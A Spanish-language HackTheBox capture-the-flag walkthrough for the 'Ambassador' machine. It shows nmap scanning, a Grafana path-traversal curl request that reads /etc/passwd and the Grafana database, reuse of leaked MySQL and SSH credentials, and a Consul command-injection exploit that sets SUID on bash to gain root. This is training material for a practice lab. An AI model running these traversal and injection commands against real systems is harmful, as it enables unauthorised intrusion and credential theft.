---
title: Ambassador Writeup
author:
date: 03-03-2023
categories: [HackTheBox, Machines Medium]
tags: [Writeup, Guías, HackTheBox,Linux, Path Traversal, Grafana,Web,Databases,Arbitrary File Read]
pin: false
image:
  path: /assets/img/commons/Ambassador/Ambassador.png
  alt: Ambassador WriteUp
---
**10.10.11.183 Ambassador (medium machine)** otra guía para la resolución de esta máquina tocando un poco de path traversal aprovechandonos de un exploit en grafana y una escalada por medio de git. 

## Information Ghatering / ScanPorts

- Comenzamos con la fase de recolección de información haciendo un escaneo por TCP en todos los puertos con nmap 

```console
$ nmap -p-  -sS -vvv  --min-rate 2000 -n -Pn 10.10.11.128 -oG allPorts 
```
-p-  -> escanearemos todos los rangos de puertos (65535)

-sS -> análisis utilizando TCP SYN Este tipo de escaneo, está basado en la velocidad de escaneo, de ahí la versatilidad que mencionamos anteriormente, ya que permite escanear miles de puertos por segundo en una red que se encuentre desprotegida o carezca de un firewall, no termina la conexión TCP/SYN - Envias un SYN - Recibes un SYN/ACK - Envias ResetPacket

-vvv -> verbose para que mediante vayas descubriendo puertos se reporten en la terminal

--min-rate 2000 -> paquetes enviados no mas lentos que 2000 paquetes por segundo, envío de paquetes super rápido

-n -> que no aplique resoluci+on de DNS para que no tarde el escaneo

-Pn -> ni que me detecte el descburimiento de hosts
```console
$ nmap -p-  -sS -vvv  --min-rate 2000 -n -Pn 10.10.11.183 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-03 17:07 CST
Initiating SYN Stealth Scan at 17:07
Scanning 10.10.11.183 [65535 ports]
Discovered open port 22/tcp on 10.10.11.183
Discovered open port 3306/tcp on 10.10.11.183
Discovered open port 80/tcp on 10.10.11.183
Increasing send delay for 10.10.11.183 from 0 to 5 due to max_successful_tryno increase to 4
Discovered open port 3000/tcp on 10.10.11.183
Completed SYN Stealth Scan at 17:08, 33.09s elapsed (65535 total ports)
Nmap scan report for 10.10.11.183
Host is up, received user-set (0.076s latency).
Scanned at 2023-03-03 17:07:30 CST for 33s
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63
3000/tcp open  ppp     syn-ack ttl 63
3306/tcp open  mysql   syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 33.27 seconds
           Raw packets sent: 66226 (2.914MB) | Rcvd: 66200 (2.648MB)
```
aplicamos escaneo mas profundo a los puertos encontrados

-sCV -> escaneo lanzando scripts que detecten servicios y versiones

-p -> especeficando los puertos a escanear

-oN y todo nuestro output lo guardamos en una captura formato nmap con el nombre de targeted

```console
$ nmap -sCV -p22,80,3000,3306 10.10.11.183 -oN targeted               
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-03 17:21 CST
Nmap scan report for 10.10.11.183
Host is up (0.068s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 29dd8ed7171e8e3090873cc651007c75 (RSA)
|   256 80a4c52e9ab1ecda276439a408973bef (ECDSA)
|_  256 f590ba7ded55cb7007f2bbc891931bf6 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Hugo 0.94.2
|_http-title: Ambassador Development Server
|_http-server-header: Apache/2.4.41 (Ubuntu)
3000/tcp open  ppp?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Content-Type: text/html; charset=utf-8
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity.txt%252ebak; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Fri, 03 Mar 2023 23:21:54 GMT
|     Content-Length: 29
|     href="/login">Found</a>.
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Content-Type: text/html; charset=utf-8
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Fri, 03 Mar 2023 23:21:22 GMT
|     Content-Length: 29
|     href="/login">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Fri, 03 Mar 2023 23:21:28 GMT
|_    Content-Length: 0
3306/tcp open  mysql   MySQL 8.0.30-0ubuntu0.20.04.2
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.30-0ubuntu0.20.04.2
|   Thread ID: 9
|   Capabilities flags: 65535
|   Some Capabilities: ConnectWithDatabase, Speaks41ProtocolOld, SupportsTransactions, InteractiveClient, LongPassword, FoundRows, LongColumnFlag, SupportsCompression, IgnoreSpaceBeforeParenthesis, IgnoreSigpipes, Speaks41ProtocolNew, SwitchToSSLAfterHandshake, ODBCClient, DontAllowDatabaseTableColumn, SupportsLoadDataLocal, Support41Auth, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: zh\x16r5Y\x04r\x02z\x1E\x1A\x04=z<kYxe
|_  Auth Plugin Name: caching_sha2_password
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.93%I=7%D=3/3%Time=640280F4%P=x86_64-pc-linux-gnu%r(Gen
SF:ericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20te
SF:xt/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x2
SF:0Request")%r(GetRequest,174,"HTTP/1\.0\x20302\x20Found\r\nCache-Control
SF::\x20no-cache\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nExpire
SF:s:\x20-1\r\nLocation:\x20/login\r\nPragma:\x20no-cache\r\nSet-Cookie:\x
SF:20redirect_to=%2F;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nX-Content
SF:-Type-Options:\x20nosniff\r\nX-Frame-Options:\x20deny\r\nX-Xss-Protecti
SF:on:\x201;\x20mode=block\r\nDate:\x20Fri,\x2003\x20Mar\x202023\x2023:21:
SF:22\x20GMT\r\nContent-Length:\x2029\r\n\r\n<a\x20href=\"/login\">Found</
SF:a>\.\n\n")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Typ
SF:e:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x
SF:20Bad\x20Request")%r(HTTPOptions,12E,"HTTP/1\.0\x20302\x20Found\r\nCach
SF:e-Control:\x20no-cache\r\nExpires:\x20-1\r\nLocation:\x20/login\r\nPrag
SF:ma:\x20no-cache\r\nSet-Cookie:\x20redirect_to=%2F;\x20Path=/;\x20HttpOn
SF:ly;\x20SameSite=Lax\r\nX-Content-Type-Options:\x20nosniff\r\nX-Frame-Op
SF:tions:\x20deny\r\nX-Xss-Protection:\x201;\x20mode=block\r\nDate:\x20Fri
SF:,\x2003\x20Mar\x202023\x2023:21:28\x20GMT\r\nContent-Length:\x200\r\n\r
SF:\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Ty
SF:pe:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\
SF:x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Requ
SF:est\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20
SF:close\r\n\r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\
SF:.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=
SF:utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessi
SF:onReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/p
SF:lain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Req
SF:uest")%r(Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Typ
SF:e:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x
SF:20Bad\x20Request")%r(FourOhFourRequest,1A1,"HTTP/1\.0\x20302\x20Found\r
SF:\nCache-Control:\x20no-cache\r\nContent-Type:\x20text/html;\x20charset=
SF:utf-8\r\nExpires:\x20-1\r\nLocation:\x20/login\r\nPragma:\x20no-cache\r
SF:\nSet-Cookie:\x20redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity\.txt%
SF:252ebak;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nX-Content-Type-Opti
SF:ons:\x20nosniff\r\nX-Frame-Options:\x20deny\r\nX-Xss-Protection:\x201;\
SF:x20mode=block\r\nDate:\x20Fri,\x2003\x20Mar\x202023\x2023:21:54\x20GMT\
SF:r\nContent-Length:\x2029\r\n\r\n<a\x20href=\"/login\">Found</a>\.\n\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 122.30 seconds
```
aqui podemos visualizar varias cosas una de ellas que me llame enseguida la atención es el puerto 3306(MySQL) y 3000, normalmente al ver un puerto como el 3000 se esconden servicios web alojados fuera de la vista del publico, asi que vamos a ingresar para ver mas a detalle las cosas
![](/assets/img/commons/Ambassador/grafana.png)

y efectivamente es un login de sesión, si nos fijamos bien por debajo tenemos la versión por lo tanto buscaré enseguida un exploit relacionado a grafana y vemos uno de unaa version 8.3.0 
![](/assets/img/commons/Ambassador/exploit.png)

me lo traeré a mi máquina y lo analizaremos
![](/assets/img/commons/Ambassador/exploit1.png)

![](/assets/img/commons/Ambassador/exploit2.png)

## Arbitrary File Read Exploitation
en la primera imagen podemos visualizar que emplea una lista larga de plugins al respecto y en la segunda vemos como opción colocar algun plugin seguido de la ruta /public/plugins
```console
/public/plugins/' + choice(plugin_list) + '/../../../../../../../../../../../../..
```
asi que primero para comprobar con curl mandaré una peticion al sitio web por GET a la ruta /public/plugins y eligré un plugin aleatorio de esa lista seguido del archivo al cual queremos apuntar para leer, haré la primera prueba con el /etc/passwd 
 
> Nota: importante al hacer el path traversal con curl contemplar el parámetro --path-as-is para poder especificar rutas en el sistema 

```console
curl -s -X GET http://10.10.11.183:3000/public/plugins/text/../../../../../../../../../../../../../etc/passwd --path-as-is
```
![](/assets/img/commons/Ambassador/terminal.png)

y vemos que con éxito podemos leer el /etc/passwd:) a nivel de usuarios en el sistema está root y developer, recordemos que esta contemplada una base de datos. Buscando un poco de documentación sobre posibles rutas de grafana me encontré la ruta predeterminada para la base de datos de grafana [locationGrafanaDB](https://stackoverflow.com/questions/65860003/physical-location-of-grafana-dashboards)
```console
curl -s -X GET http://10.10.11.183:3000/public/plugins/text/../../../../../../../../../../../../../var/lib/grafana/grafana.db --path-as-is -o grafana.db 
```
> utilizaré el parametro -o para guardar el otput a mi máquina

![](/assets/img/commons/Ambassador/terminal1.png) 

y vemos que es un archivo de base de datos sqlite3, lo inspeccionaré con sqlit3 para ver su contenido

![](/assets/img/commons/Ambassador/terminal2.png)

al checar las tablas y seleccionar data_source vemos un nombre y una contraseña de mysql **Importante recordar que esta expuesto el puerto 3306**
```
2|1|1|mysql|mysql.yaml|proxy||dontStandSoCloseToMe63221!|grafana|grafana|0|||0|{}|2022-09-01 22:43:03|2023-03-03 16:50:40|0|{}|1|uKewFgM4z
```
asi que iniciaŕe sesión como grafana y su password **dontStandSoCloseToMe63221!** 

![](/assets/img/commons/Ambassador/terminal3.png)

si vemos las bases de datos existentes hay una que se llama whackywidget eso da curiosidad al ver las tablas hay solamente una llamada users y al visualizar su contenido vemos al usaurio developer y una contraseña en base64 
developer:YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== **Recordemos que developer el leer el /etc/passwd es un usario a nivel de sistema**
haŕe el proceso inverso en decodificar el base64 y me conectaré por ssh como el usuario developer
```bash
$ echo -n 'YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg==' | base64 -d 
anEnglishManInNewYork027468
```
![](/assets/img/commons/Ambassador/terminal3.png)

y estamos dentro de ssh la primera flag completada vamos a escalar nuestro privilegio:))

![](/assets/img/commons/Ambassador/terminal4.png)

## Privilege Escalation - Post Exploitation
si buscamos directorios ocultos vemos un gitconfig 

![](/assets/img/commons/Ambassador/terminal5.png)

donde en la carpeta /opt/my-app se encuentran esos archivos y el propietario es root

![](/assets/img/commons/Ambassador/terminal6.png)

daré un git show para visualizar el contenido del commit

![](/assets/img/commons/Ambassador/terminal7.png)

vemos un token que se quitó en el ultimo commit todo esto haciendose con consul "Consul es una herramienta Open Source para la detección y configuración de servicios en la infraestructura de aplicaciones de centros de datos distribuidos y de alta disponibilidad." 
buscando un exploit asociado vemos uno de [Hashicorp-Consul](https://github.com/owalid/consul-rce) "explota una vulnerabilidad de inyección de comandos en Consul Api Services. La vulnerabilidad existe en el ServiceIDparámetro de la PUT /v1/agent/service/registerPunto final de la API. El ServiceIDEl parámetro se utiliza para registrar un servicio con el agente Consul. El ServiceIDEl parámetro no se desinfecta y permite la inyección de comandos. Esta vulnerabilidad se puede utilizar para ejecutar comandos arbitrarios en el host que ejecuta el agente Consul."
como dicha vulnerabilidad se da en el host de la máquina victima en local me transferiré el script en python compartiendome un servidor con python3

![](/assets/img/commons/Ambassador/terminal8.png)

una vez pasando el script si lo analizamos vemos que no es complejo su uso simplemente tenemos que pasarle el token que vimos en el commit y un comando deseado a ejecutar a nivel del sistema
 
![](/assets/img/commons/Ambassador/terminal9.png)

```console
python3 consul_rce.py -th 127.0.0.1 -tp 8500 -ct <CONSUL_TOKEN> -c "/bin/bash /tmp/pwn.sh"
```
por lo tanto quedaría de la siguiente forma ya con nuestro token del commit y en -c 'command' como esta con permisos de root al ejecutar el exploit quiero activar los permisos SUID a la bash 
```console
python3 consul_rce.py -th 127.0.0.1 -tp 8500 -ct bb03b43b-1d81-d62b-24b5-39540ee469b5 -c "chmod u+s /bin/bash"
```
![](/assets/img/commons/Ambassador/terminal10.png)

vemos que ya tenemos permisos SUID a la bash, solo ejecutamos bas -p (-p de privilege) y estamos ya como el usuario root y otra máquina mas hecha y apuntada 

![](/assets/img/commons/Ambassador/terminal11.png)
